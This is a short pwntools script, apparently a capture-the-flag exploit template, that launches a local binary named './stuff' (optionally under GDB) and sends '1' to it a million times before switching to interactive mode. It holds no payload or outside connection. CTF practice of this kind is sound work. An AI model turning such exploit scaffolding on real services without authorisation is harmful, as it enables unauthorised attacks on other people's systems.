#!/usr/bin/python3
from pwn import *

exe = './stuff'
elf = context.binary = ELF(exe)
# libc = ELF("")

def start(argv=[], *a, **kw):

    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()

for i in range(1000000):
    p.recvuntil(b"\n")
    p.sendline(b"1")
    print(p.recvline())
p.interactive()
